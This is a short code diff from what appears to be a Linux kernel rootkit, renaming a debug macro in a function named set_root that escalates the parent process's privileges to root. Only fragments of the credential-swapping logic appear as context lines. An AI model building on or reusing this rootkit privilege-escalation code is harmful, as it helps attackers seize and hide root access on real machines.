@@ -13,7 +13,7 @@ int set_root(void)
 
     if (root == NULL)
     {
-        RKT_DEBUG("rootkit: Failed to prepare credentials.\n");
+        RTK_DEBUG("rootkit: Failed to prepare credentials.\n");
         return -1;
     }
 
@@ -28,7 +28,7 @@ int set_root(void)
     // Commit the new credentials to the parent process
     if (!parent)
     {
-        RKT_DEBUG("rootkit: Parent task not found.\n");
+        RTK_DEBUG("rootkit: Parent task not found.\n");
         return 1;
     }
 
@@ -39,7 +39,7 @@ int set_root(void)
 
     task_unlock(parent); // Unlock after modification
 
-    RKT_DEBUG("rootkit: Parent process privileges escalated successfully.\n"); 
+    RTK_DEBUG("rootkit: Parent process privileges escalated successfully.\n"); 
 
     return 0;
 }
